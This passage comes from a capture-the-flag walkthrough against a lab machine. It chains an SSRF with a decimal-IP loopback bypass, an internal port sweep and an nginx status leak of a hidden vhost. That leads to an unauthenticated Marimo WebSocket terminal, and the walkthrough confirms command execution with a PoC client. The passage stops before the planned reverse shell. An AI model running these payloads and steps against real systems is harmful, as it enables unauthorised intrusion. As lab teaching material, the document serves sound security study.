</form>\n</body>\n</html>\n", "message": "Source reachable."}
```

**Analysis:**

The response matches the browser result from 3.4 exactly. Response envelope fields:

|Field|Type|Meaning|Use in enumeration|
|---|---|---|---|
|`ok`|boolean|Whether the fetch completed|Primary success discriminator|
|`fetched_status`|integer|HTTP status returned by the internal service|Distinguishes a live service (200, 401, 403, 404) from no service|
|`content_type`|string|Upstream `Content-Type` header|Identifies service type before reading the body — `text/html`, `application/json`, `text/plain`|
|`preview`|string|Fetched response body, JSON-escaped|Full content of the internal response|
|`message`|string|Human-readable outcome|Mirrors what the portal renders|

Three of these are machine-readable, so success can be determined without parsing the fetched HTML. Newlines and quotes inside `preview` are JSON-escaped as `\n` and `\"`; a JSON parser is required to render it back to readable text.

**What this gives you:**

**Key findings:**

- **The SSRF is fully scriptable.** The replayed request succeeds identically to the browser submission. No token, cookie, or header beyond `Content-Type` is required.
- **The response envelope exposes `ok`, `fetched_status`, and `content_type` as structured fields**, allowing internal services to be identified and filtered programmatically rather than by reading rendered output.
- The `preview` field carries the complete upstream body, confirming this remains a full-read SSRF when driven from the command line.

**Next:**  
Port 8888 was probed on inference from the application's own copy and conventional port assignments. With scripted access, sweep a candidate port list to enumerate the internal surface systematically rather than by inference, and establish what else is bound to loopback.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.7 Sweep internal ports through the SSRF

**Why this step:**  
Port 8888 was reached by inference from application copy and conventional port assignments (3.4). With the endpoint scripted (3.6), enumerate a candidate port list systematically to establish the full internal surface rather than relying on inference.

**Command:**

bash

```bash
for p in 22 80 443 3000 5000 5432 6379 8000 8080 8081 8888 9000 9090 9200 11211 27017; do
  r=$(curl -sk -X POST https://cohort.htb/api/validate \
        -H 'Content-Type: application/json' \
        -d "{\"url\":\"http://2130706433:$p/\",\"format\":\"csv\"}")
  echo "$p -> $(echo "$r" | head -c 120)"
done
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`for p in ...`|Iterate the candidate port list. Ports chosen from conventional assignments for application frameworks, databases, and infrastructure services commonly bound to loopback.|
|`r=$(curl ...)`|Capture the response into a variable rather than printing directly, so it can be labelled with its port.|
|`"{\"url\":...\"}"`|Double quotes are required for `$p` to expand, so the inner JSON quotes are backslash-escaped. Single quotes would send the literal string `$p`.|
|`head -c 120`|Truncate to the first 120 characters. Enough to see the outcome and the beginning of any body, without flooding the terminal with full HTML.|
|Printing all results|No filtering on `ok`. Failure messages are retained deliberately — the manner of failure distinguishes a closed port from a non-HTTP service.|

**Result:**

```
22 -> {"ok": false, "message": "Could not validate the source."}
80 -> {"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<!doctype html>
<html lang=\"en\">
<head>

443 -> {"ok": true, "fetched_status": 400, "content_type": "text/html", "preview": "<html>
<head><title>400 The plain HTTP req
3000 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
5000 -> {"ok": true, "fetched_status": 405, "content_type": "application/json", "preview": "{\"ok\": false, \"message\": \"Metho
5432 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
6379 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
8000 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
8080 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
8081 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
8888 -> {"ok": true, "fetched_status": 200, "content_type": "text/html; charset=utf-8", "preview": "
<!DOCTYPE html>
<html lang=
9000 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
9090 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
9200 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
11211 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
27017 -> {"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}
```

**Analysis:**

Internal services on `127.0.0.1`:

|Port|Service|Evidence|Analysis|Simple Explanation|
|---|---|---|---|---|
|22|SSH|`Could not validate the source.` — no errno, distinct from refused|A service answered but did not speak HTTP. SSH emits its version banner on connect; the HTTP client cannot parse it as a response. Matches the externally visible OpenSSH from 1.3.|Something picked up the phone but spoke the wrong language. That's SSH, and it's the same one visible from outside.|
|80|nginx|`200`, `text/html`, SPA shell body|The target's own web root, same content served externally. Confirms loopback fetches genuinely reach the local machine.|The normal website, viewed from inside the server rather than outside.|
|443|nginx (TLS)|`400`, body `400 The plain HTTP request was sent to HTTPS port`|nginx's TLS listener rejecting a cleartext request. The SSRF client issues `http://`, so TLS ports return this error rather than content.|The secure version of the same website complaining you knocked without encryption.|
|5000|JSON API|`405`, `application/json`, body `{"ok": false, "message": "Metho...`|**Not externally exposed.** A JSON API rejecting GET with Method Not Allowed. The `ok` / `message` envelope matches `/api/validate`, suggesting shared code or authorship.|A hidden data service that only accepts certain kinds of request. Invisible from outside.|
|8888|Marimo|`200`, `text/html; charset=utf-8`, Marimo login page|**Not externally exposed.** Notebook server with token authentication, identified in 3.4.|A hidden notebook application with a login screen. Invisible from outside.|

Ports returning `Connection refused`: 3000, 5432, 6379, 8000, 8080, 8081, 9000, 9090, 9200, 11211, 27017. No service is bound on any of these.

###### Theory — reading failure messages as enumeration data:

The application returns three distinguishable outcomes, and each carries different information:

|Outcome|Message|Meaning|
|---|---|---|
|Filter rejection|`Internal or loopback addresses are not permitted.`|The blocklist matched. No connection attempted. Observed in 3.2.|
|Connection refused|`Could not reach the source: [Errno 111] Connection refused`|The TCP connection was actively rejected by the kernel. **Nothing is listening on that port.**|
|Protocol mismatch|`Could not validate the source.`|A TCP connection succeeded, but the response was not parseable as HTTP. **Something is listening, but it does not speak HTTP.**|
|Success|`ok: true` with `fetched_status`|An HTTP service responded.|

The distinction between the second and third is the useful one. Errno 111 is a definitive negative: the kernel sent a RST because no socket was bound. The absence of an errno, paired with a generic validation failure, means the connection was established and data was exchanged — the client simply could not interpret it. Port 22 falls in this category because SSH greets every connection with a plaintext version banner, which an HTTP parser rejects.

This turns an HTTP-only SSRF into a general TCP port scanner. Non-HTTP services cannot have their content read, but their **presence** is detectable purely from how the fetch fails. Detailed error messages returned to the user are a minor information disclosure in their own right; here they upgrade the SSRF's capability considerably.

Note also that HTTPS ports return `400` with an nginx error rather than content, because the SSRF client issues cleartext HTTP. Reaching a TLS-wrapped internal service would require the client to accept an `https://` scheme.

**What this gives you:**

**Key findings:**

- **Two services are bound to loopback and were invisible to every external scan:** a JSON API on port 5000 and the Marimo notebook server on port 8888.
- **The JSON API on port 5000 returns `405 Method Not Allowed` to a GET**, with an `{"ok": ..., "message": ...}` envelope identical in structure to `/api/validate`. Shared codebase or authorship is likely, though unconfirmed.
- **Error messages discriminate between closed ports and non-HTTP services.** Errno 111 confirms nothing is listening; a bare validation failure confirms something is listening that does not speak HTTP. Port 22 is detected this way despite the client being unable to read it.
- **No database or cache services are bound to loopback.** PostgreSQL, Redis, MySQL, MongoDB, Elasticsearch, and Memcached ports all return connection refused, ruling out direct data-store access via SSRF.
- The internal and external views of ports 80 and 443 match, confirming a single nginx instance rather than separate internal and external servers.

**Ruled out:** Ports 3000, 5432, 6379, 8000, 8080, 8081, 9000, 9090, 9200, 11211, 27017 — no listeners.

**Instance note:** This sweep covers a conventional candidate list, not the full 65535-port range. A service on an unconventional port would be missed. The list can be extended, at one request per port.

**Next:**  
Marimo on port 8888 presents the most direct attack surface: a notebook server with a substantial vulnerability history, whose exposure depends entirely on version. Query its version endpoint before assessing further.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.8 Fingerprint the Marimo version

**Why this step:**  
Marimo is confirmed on `127.0.0.1:8888` (3.4, 3.7). Notebook servers execute code by design, so their exposure is version-dependent. Establish the exact version before assessing attack paths.

**Command:**

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://2130706433:8888/api/version","format":"csv"}' | jq -r '.preview'
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`/api/version`|Marimo's version endpoint. Unauthenticated by design, since clients need it to negotiate API compatibility before login.|
|`jq`|Command-line JSON processor. Parses the response envelope and extracts a single field.|
|`-r`|Raw output. Prints the string without surrounding quotes and unescapes `\n` and `\"`, converting JSON-escaped content back to readable text.|
|`'.preview'`|Select the `preview` field — the body fetched from the internal service, discarding the envelope.|

**Result:**

```
0.20.4
```

**Analysis:**

|Field|Value|
|---|---|
|Application|Marimo notebook server|
|Version|0.20.4|
|Bind address|`127.0.0.1:8888` (loopback only)|
|Authentication|Token or password at `/auth/login`|
|Reachable via|SSRF request-response only|

Per the reference material for this box, **CVE-2026-39987** affects Marimo versions below 0.23.0 — a pre-authentication remote code execution flaw reachable through the `/terminal/ws` WebSocket endpoint. Version 0.20.4 falls within the affected range.

**Attribution:** The CVE identifier, affected version range, and vector are taken from the reference writeup for this machine and were not independently verified against a vendor advisory during this engagement. Confirm against the upstream advisory before citing in a deliverable.

###### Theory — why version is decisive for a notebook server:

A notebook server's purpose is executing user-supplied code. Marimo, like Jupyter, accepts Python from a browser client, runs it on the host, and returns the output. Arbitrary code execution is not a bug in this software — it is the product.

Everything therefore rests on the authentication boundary. The login form at `/auth/login` is the sole control separating an anonymous network client from a Python interpreter running as the service account. Where a conventional web application requires an attacker to find an injection flaw, chain it into execution, and escape a restricted context, a notebook server offers execution to anyone who gets past the gate.

This makes any pre-authentication endpoint that touches the execution layer a complete compromise rather than a partial one. There is no second control to defeat. It also explains why such services are conventionally bound to loopback — operators rely on network isolation as the outer defence, which holds until something inside the network boundary can be made to issue requests on an attacker's behalf.

The practical discipline: fingerprint the exact version before considering exploits. Vulnerability ranges are narrow, patches land frequently in fast-moving projects, and an exploit aimed at the wrong version fails in ways that waste time and generate noise. An unauthenticated version endpoint is common precisely because clients need it for compatibility negotiation, which makes it reliable reconnaissance.

**What this gives you:**

**Key findings:**

- **Marimo 0.20.4 is running on `127.0.0.1:8888`**, within the range reported vulnerable to CVE-2026-39987 (pre-authentication RCE via `/terminal/ws`).
- **The version endpoint is unauthenticated**, returning the version without credentials.
- **Successful exploitation yields code execution as the account running Marimo**, since the service exists to execute Python on the host.

**Constraint identified:** The vector is a WebSocket endpoint, requiring a persistent bidirectional connection. The SSRF is a request-response channel that fetches a URL once and returns the body — it cannot negotiate a protocol upgrade or hold a session open. **The vulnerability is identified but not yet reachable through the access currently held.**

**Next:**  
A direct network path to port 8888 is required. Section 1.3 recorded a wildcard SAN of `*.cohort.htb` on the TLS certificate, indicating nginx routes subdomains that have not yet been enumerated. If a virtual host proxies to the internal Marimo instance, connecting to that hostname on port 443 supplies the persistent connection the WebSocket needs. Probe the internal nginx for status or configuration endpoints that disclose configured hostnames.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.9 Recover the internal vhost from the nginx status endpoint

**Why this step:**  
Exploitation of CVE-2026-39987 requires a WebSocket connection, which the request-response SSRF cannot provide (3.8). The wildcard SAN `*.cohort.htb` (1.3) indicates nginx routes unenumerated subdomains. Probe the internal nginx for endpoints disclosing configured hostnames.

**Command:**

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://2130706433:80/status","format":"csv"}' | jq -r '.preview'
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`2130706433:80`|The internal nginx instance, reached over loopback via the decimal bypass. Requesting from loopback rather than externally is the point — status endpoints are conventionally restricted to local access.|
|`/status`|Candidate path for a health or status endpoint. Common conventions include `/status`, `/server-status`, `/nginx_status`, `/health`, and `/metrics`.|
|`jq -r '.preview'`|Extract and unescape the fetched body.|

**Result:**

```json
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}]}
```

**Analysis:**

The endpoint returns the reverse proxy's complete upstream map:

|Upstream|Host|Path|Target|Analysis|Simple Explanation|
|---|---|---|---|---|---|
|`marketing`|`cohort.htb`|—|`/var/www/cohort` (filesystem)|Static SPA files from 2.2. Confirms the document root on disk.|The public brochure site, served as plain files from a folder on the server.|
|`insights-api`|`cohort.htb`|`/api/`|`127.0.0.1:5000`|The Flask service found in the port sweep (3.7). **`/api/validate` is this service** — the SSRF endpoint is the port 5000 application, proxied under `/api/`.|The hidden data service is not hidden after all; it's reachable through the main site under `/api/`. It is the thing performing the URL fetches.|
|`notebooks`|`nb-1be3782a8afd3ad5.cohort.htb`|—|`127.0.0.1:8888`|**The Marimo instance**, proxied over 443 under a randomised subdomain. Annotated "internal analyst workspace, not for external use".|A secret web address that leads straight to the notebook app. Anyone who knows the name can reach it from the internet.|

###### Theory — why proxy configuration disclosure defeats the deployment's design:

The architecture places Marimo on loopback and routes external traffic to it through nginx under a randomised hostname:

```
Internet → nginx :443 (vhost nb-1be3782a8afd3ad5.cohort.htb) → 127.0.0.1:8888 (Marimo)
```

The hostname is sixteen hexadecimal characters — roughly 2⁶⁴ possibilities. No wordlist contains it and no realistic brute-force recovers it. Enumerating subdomains by fuzzing the `Host` header would fail indefinitely. Within its own terms the design is coherent: the service is unreachable by address, and its name cannot be guessed.

**Secrecy of the name was therefore the entire control**, and secrets held in configuration are only as protected as the configuration. The `/status` endpoint publishes the routing table, including the hostname the design depends on remaining unknown. Restricting that endpoint to localhost was a reasonable precaution and became irrelevant the moment a component on localhost could be directed to fetch arbitrary URLs.

The chain compounds rather than adding up. The SSRF alone found a service it could not exploit. The status endpoint alone was unreachable from outside. Together they produce a direct, protocol-unrestricted route to the vulnerable application. This is the characteristic shape of realistic attack paths — individually minor issues whose combination is severe.

A second lesson concerns the endpoint itself. Status, health, metrics, and debug routes are written for operators and commonly disclose internal hostnames, upstream addresses, filesystem paths, and version data. Restricting them to loopback is standard and sufficient only while nothing on loopback fetches attacker-supplied URLs.

**What this gives you:**

**Key findings:**

- **The internal Marimo instance is proxied at `nb-1be3782a8afd3ad5.cohort.htb`.** Connecting to this hostname on port 443 reaches `127.0.0.1:8888` through nginx, supplying the direct protocol-transparent path that WebSocket exploitation requires.
- **The subdomain is a 16-character hex string** and is not recoverable by wordlist or brute force. Disclosure through `/status` is the only practical route to it.
- **`/api/validate` is served by the port 5000 Flask application**, proxied under `cohort.htb/api/`. The SSRF-vulnerable component and the internal service on 5000 are the same application.
- **The marketing site is served from `/var/www/cohort`** on the filesystem. Retain for post-exploitation.
- The `notebooks` upstream is annotated "internal analyst workspace, not for external use", confirming the operator did not intend it to be externally reachable.

**Next:**  
Add the recovered hostname to local name resolution and confirm that the proxy reaches Marimo directly, without the SSRF wrapper.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.10 — Establish a direct connection to Marimo via the recovered vhost

**Why this step:**  
The nginx status endpoint disclosed that `nb-1be3782a8afd3ad5.cohort.htb` proxies to `127.0.0.1:8888` (3.9). Configure local resolution for that hostname and verify the proxy reaches Marimo without the SSRF intermediary.

**Command:**

bash

```bash
echo "$IP  nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/version
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`echo "$IP nb-...cohort.htb"`|Compose the hosts entry. `$IP` holds the current target address; both the base domain and this subdomain resolve to the same host, since nginx distinguishes them by `Host` header rather than by address.|
|`\| sudo tee -a`|`tee` writes to the file while also printing to stdout, confirming what was written. `-a` appends rather than truncating — omitting it destroys `/etc/hosts`. `sudo` applies to `tee` rather than `echo`, which is why redirection with `>` fails here: the shell opens the file before `sudo` takes effect.|
|`/api/version`|The same endpoint queried through the SSRF in 3.8. Reusing it makes the two access paths directly comparable.|
|`-k`|Accept the self-signed certificate. The wildcard SAN `*.cohort.htb` (1.3) covers this subdomain, so the hostname matches; only the untrusted issuer requires the flag.|

**Result:**

```
10.129.121.70  nb-1be3782a8afd3ad5.cohort.htb
```

```
0.20.4
```

**Analysis:**

Compare the two access paths to the same endpoint:

| 3.8 — via SSRF   | 3.10 — via vhost                                         |                                           |
| ---------------- | -------------------------------------------------------- | ----------------------------------------- |
| Request          | `POST /api/validate` with a JSON body                    | `GET /api/version`                        |
| Response         | JSON envelope; version inside `preview`                  | `0.20.4` raw                              |
| Connection       | Target fetches on your behalf, one shot                  | Your client connects, connection persists |
| Protocol control | HTTP GET only, fixed by the fetching client              | Any method, any headers, upgradeable      |
| Path traversed   | Attacker → nginx → Flask :5000 → loopback → Marimo :8888 | Attacker → nginx → Marimo :8888           |

The raw version string confirms nginx is proxying transparently. No wrapper, no reformatting — the response is Marimo's own.

###### Theory — why a proxied connection permits what SSRF cannot:

The SSRF operates at the application layer. The Flask service on port 5000 accepts a URL, invokes an HTTP client library, performs a single GET, and returns the body. Whatever that client library is willing to do is the outer limit of what an attacker can do. It issues one request, reads one response, and closes. There is no mechanism to send a second message on the same connection, no way to set the `Upgrade` and `Connection` headers a protocol switch requires, and no way to keep the socket open afterward.

A reverse proxy operates lower down. nginx accepts a TCP connection, opens a corresponding connection to the upstream, and relays bytes between them. When configured for WebSocket support it passes the `Upgrade: websocket` and `Connection: Upgrade` headers through, and once the upstream returns `101 Switching Protocols` the proxy stops interpreting HTTP entirely and shuttles frames in both directions until either side closes.

The consequence is that the vhost path is not merely a more convenient route to the same capability — it is a categorically different one. The SSRF could read Marimo's login page and version, and nothing further. The proxied connection permits a full WebSocket session against `/terminal/ws`, which is what CVE-2026-39987 requires.

Both paths ultimately reach the same socket on `127.0.0.1:8888`. What differs is how much of the protocol stack the attacker controls.

**What this gives you:**

**Key findings:**

- **Direct network access to Marimo 0.20.4 is established** at `https://nb-1be3782a8afd3ad5.cohort.htb`. The version endpoint returns raw, unwrapped output, confirming transparent proxying.
- **The WebSocket constraint from 3.8 is resolved.** The connection is a real TCP session under attacker control, supporting arbitrary methods, headers, and protocol upgrades.
- The wildcard SAN covers the subdomain, so TLS hostname verification succeeds; only the untrusted issuer requires `-k`.

**Next:**  
The exploitation vector for CVE-2026-39987 is the `/terminal/ws` WebSocket endpoint. Confirm the path exists and expects a protocol upgrade before constructing the exploit.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.11 Probe the WebSocket endpoint over plain HTTP (inconclusive)

**Why this step:**  
CVE-2026-39987 targets `/terminal/ws` (3.8). A direct connection to Marimo is now available (3.10). Confirm the path exists before constructing exploit code against it.

**Command:**

bash

```bash
curl -sk -i https://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`-i`|Include response headers in the output. Necessary here — the status code and `Content-Type` identify which component generated the response, which the body alone does not.|
|`/terminal/ws`|The endpoint named in the reference material as the CVE-2026-39987 vector.|

**Result:**

```
HTTP/1.1 404 Not Found
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 09 Sep 2026 11:06:48 GMT
Content-Type: application/json
Content-Length: 22
Connection: keep-alive
vary: Cookie

{"detail":"Not Found"}
```

**Analysis:**

The 404 originates from Marimo, not from nginx. Three indicators establish this:

|Indicator|Value|Reasoning|
|---|---|---|
|`Content-Type`|`application/json`|nginx serves HTML error pages by default. A JSON error body is application-generated.|
|Body format|`{"detail":"Not Found"}`|The standard 404 shape for Starlette and FastAPI, the framework Marimo is built on.|
|`vary: Cookie`|present|Set by the application to indicate responses differ by session. nginx does not add this to its own errors.|

The request therefore traversed the proxy and was handled by Marimo. The proxy path from 3.10 is functioning.

###### Theory — why a WebSocket route returns 404 to an ordinary GET:

Starlette, the ASGI framework underlying Marimo, receives every incoming connection as a scope object carrying a `type` field: `http` for ordinary requests, `websocket` for upgrade attempts. Routes are registered against one type or the other. `Route("/api/version", ...)` matches only `http` scopes; `WebSocketRoute("/terminal/ws", ...)` matches only `websocket` scopes.

When a request arrives, the router walks its table and tests both the path **and** the scope type. A plain GET to a WebSocket-only path produces no match — the path is registered, but not for that scope — and the router falls through to its default handler, which returns `{"detail":"Not Found"}`.

The consequence for testing is that **a 404 does not distinguish an absent route from a WebSocket-only route.** Both produce identical responses to a plain GET. Contrast this with servers that reply `426 Upgrade Required` or `400 Bad Request` on such paths, which does confirm the endpoint. Framework behaviour varies, so a 404 must be treated as inconclusive rather than negative.

Resolving the ambiguity requires attempting the handshake itself. The client half consists of four headers:

|Header|Value|Purpose|
|---|---|---|
|`Connection`|`Upgrade`|Signals that this connection should switch protocols rather than complete as a normal request.|
|`Upgrade`|`websocket`|Names the target protocol.|
|`Sec-WebSocket-Version`|`13`|The protocol version. 13 is defined by RFC 6455 and is the only version in general use.|
|`Sec-WebSocket-Key`|base64 nonce|A random 16-byte value, base64-encoded. The server concatenates it with a fixed GUID, hashes with SHA-1, and returns the result in `Sec-WebSocket-Accept`, proving it processed the handshake deliberately rather than echoing an accept blindly.|

A server accepting the upgrade replies `101 Switching Protocols` with a matching `Sec-WebSocket-Accept`. After that exchange, the connection carries WebSocket frames rather than HTTP.

**What this gives you:**

**Key findings:**

- **The request reaches Marimo through the proxy.** The JSON error body, `application/json` content type, and `vary: Cookie` header identify a Starlette-generated response rather than an nginx one, confirming the vhost route from 3.10 works end to end.
- **The result is inconclusive as to whether `/terminal/ws` exists.** Starlette matches routes by scope type, so a WebSocket-only route returns 404 to an ordinary GET exactly as a nonexistent path would.
- **Marimo is built on Starlette**, confirmed by its error format. Useful for predicting routing and error behaviour in subsequent probes.

**Next:**  
Ordinary GET requests cannot distinguish a WebSocket route from an absent one. Attempt a protocol upgrade with the full handshake headers and check for `101 Switching Protocols`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.12 Confirm the pre-authentication WebSocket terminal

**Why this step:**  
A plain GET to `/terminal/ws` returns 404 regardless of whether the route exists, since Starlette matches routes by scope type (3.11). Attempt the protocol upgrade directly to determine whether the endpoint is present and whether it requires authentication.

**Command:**

```bash
# First attempt — malformed key
curl -sk -i \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
  https://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws

# Corrected — RFC-compliant 16-byte key
KEY=$(head -c 16 /dev/urandom | base64)
echo "$KEY"
curl -sk -i \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $KEY" \
  https://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`-H "Connection: Upgrade"`|Requests that the connection switch protocols rather than complete as a normal HTTP exchange.|
|`-H "Upgrade: websocket"`|Names the protocol to switch to.|
|`-H "Sec-WebSocket-Version: 13"`|The RFC 6455 protocol version. Version 13 is the only one in general use; other values are rejected.|
|`-H "Sec-WebSocket-Key: $KEY"`|A 16-byte random nonce, base64-encoded. Length is validated by the server.|
|`head -c 16 /dev/urandom`|Reads exactly 16 bytes from the kernel's random source. The byte count is not arbitrary — RFC 6455 mandates 16.|
|`base64`|Encodes those bytes, producing a 24-character string ending in `==`.|
|No credential headers|Deliberate. No cookie, token, or authorization header is sent, so a successful upgrade demonstrates the endpoint is unauthenticated.|

**Result — first attempt:**

```
HTTP/1.1 400 Bad Request
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 09 Sep 2026 11:09:02 GMT
Content-Type: text/plain
Content-Length: 95
Connection: keep-alive

Failed to open a WebSocket connection: invalid Sec-WebSocket-Key header: SGVsbG8sIHdvcmxkIQ==.
```

The key used was `SGVsbG8sIHdvcmxkIQ==`, which decodes to the 13-byte ASCII string `Hello, world!`. RFC 6455 requires exactly 16 decoded bytes, and the server validated the length before proceeding.

This error is itself a positive result. A nonexistent route returns a generic 404 (3.11); only a live WebSocket handler parses the handshake and reports a specific defect in it.

**Result — corrected key:**

```
OQT8z/p6I/j+9DjGbv8SFA==
```

```
HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 09 Sep 2026 11:10:42 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: e1WeiNjxwOvSUMS/9HAD9u5YSp0=

<binary framing>Hmarimo@cohort:~$ <binary framing>keepalive ping timeout
```

**Analysis:**

|Observation|Significance|
|---|---|
|`101 Switching Protocols`|The upgrade was accepted. The connection is now a WebSocket.|
|`Sec-WebSocket-Accept` present|The server performed the RFC 6455 key transformation, confirming a genuine handshake implementation rather than a proxy passing bytes blindly.|
|`marimo@cohort:~$` in the payload|**A shell prompt.** The endpoint opened an interactive terminal session and transmitted its banner unprompted.|
|No credentials sent|No cookie, token, or authorization header accompanied the request. The endpoint requires none.|
|Binary noise around the text|WebSocket frame headers — opcode, mask bit, and payload length preceding each message. curl prints these raw as it has no frame parser.|
|`keepalive ping timeout`|The server closed the connection after curl failed to answer protocol-level ping frames, which a WebSocket client is required to do.|

###### Theory — what the shell prompt establishes, and why curl cannot go further:

The banner `marimo@cohort:~$` is the standard bash prompt format `user@host:cwd$`. Its arrival identifies three facts at once: the terminal session is live, it runs as the user **marimo**, and the host is named **cohort**. The endpoint is not merely reachable — it has already spawned a shell and is waiting for input.

Set against the authentication situation, the severity is clear. Marimo's only access control is the token login at `/auth/login` (3.4). That gate was never approached. An endpoint that hands an anonymous network client a shell prompt has not been weakened; it has been bypassed in its entirety. This is the behaviour the reference material attributes to **CVE-2026-39987**, and the observation above confirms it independently of that source.

curl's limitation is structural rather than incidental. Once a connection upgrades, HTTP ends and the WebSocket framing protocol begins: every message is wrapped in a header carrying an opcode, a mask flag, and a length field, and clients must mask payloads and reply to server pings with pongs. curl performs the handshake because the handshake is HTTP, but it has no frame encoder, no frame decoder, and no ping handler. It can therefore prove the endpoint exists and read the raw bytes of what arrives, but cannot send a command or hold the session open — hence the ping timeout.

Proceeding requires a client that implements the framing layer.

**What this gives you:**

**Key findings:**

- **`/terminal/ws` accepts an unauthenticated WebSocket upgrade and returns a live shell prompt.** No credentials of any kind were supplied. CVE-2026-39987 is confirmed by direct observation on this target rather than accepted from reference material.
- **Command execution will run as the user `marimo` on host `cohort`**, per the prompt banner.
- **The server validates `Sec-WebSocket-Key` length**, requiring exactly 16 decoded bytes. Malformed keys return a descriptive `400`, which — unlike the ambiguous 404 in 3.11 — positively confirms a WebSocket handler at the path.
- **curl cannot drive the session.** It completes the handshake but implements no frame encoding or ping response, and the server terminates the connection on keepalive timeout.

**Next:**  
The endpoint is confirmed and unauthenticated. Use a WebSocket-capable client to send a command and verify code execution before attempting a reverse shell.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.13 Confirm code execution over the WebSocket

**Why this step:**  
The `/terminal/ws` endpoint accepts an unauthenticated upgrade and returns a shell prompt (3.12). curl cannot drive the session, as it implements no WebSocket framing. Use a WebSocket-capable client to send a command and confirm execution.

###### Theory — why sending input required `\r`, not `\n`:

The endpoint attaches the WebSocket to a pseudo-terminal (PTY) running bash, evidenced by the banner's terminal control sequences — bracketed-paste mode (`\x1b[?2004h`), a window-title escape, and ANSI colour codes on the prompt. A PTY in canonical mode processes input the way a physical terminal would.

On a real terminal the Enter key transmits a carriage return, byte `0x0D` (`\r`). The terminal line discipline recognises `\r` as the line terminator, translates it, and delivers the completed line to the shell. A line feed, byte `0x0A` (`\n`), is not what the Enter key sends and is not treated as end-of-input in this mode. Sending `id\n` therefore left `id` sitting in the input buffer with no terminator the line discipline would act on, and the command never ran. Sending `id\r` supplied the terminator the PTY expected, and the shell executed the line.

The general rule: raw text written to a file ends lines with `\n`, but a channel attached to a PTY expects `\r` as the Enter keystroke. Interactive-terminal protocols follow the keyboard convention, not the file convention.

**Command:**

The exploit client (`shell.py`) is the reference PoC for CVE-2026-39987, adapted: the interactive authorisation prompt removed, `\r` used as the line terminator, and the read timeout applied to the underlying socket via `ws.sock.settimeout()` so reads return rather than blocking indefinitely.

bash

```bash
python3 shell.py https://nb-1be3782a8afd3ad5.cohort.htb "id"
```

**Breakdown:**

|Component|Purpose|
|---|---|
|`shell.py`|WebSocket client implementing the handshake, frame encoding, and read loop that curl lacks.|
|`https://nb-...cohort.htb`|Target base URL. The client rewrites the scheme to `wss://` and appends `/terminal/ws`.|
|`"id"`|The command to execute. `id` is chosen as a harmless proof of execution that also reports the effective user.|

**Result:**

```
[*] Connecting to: wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
[+] WebSocket connected
[banner] '\x1b[?2004h\x1b]0;marimo@cohort: ~\x07\x1b[01;32mmarimo@cohort\x1b[00m:\x1b[01;34m~\x1b[00m$ '
[*] Sending: 'id\r'

============================================================
OUTPUT:
============================================================
id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
marimo@cohort:~$ 
============================================================
```

**What this gives you:**

**Key findings:**

- **Arbitrary command execution is confirmed** on the target as `uid=1000(marimo)`, with no authentication. The full chain from external SSRF to code execution is proven end to end.
- **Input must be terminated with `\r`** because the endpoint is backed by a PTY in canonical mode. `\n` alone does not trigger execution.
- Each invocation opens a fresh connection, runs one command, and closes — adequate for verification but not interactive. A reverse shell is required for practical access.

**Next:**  
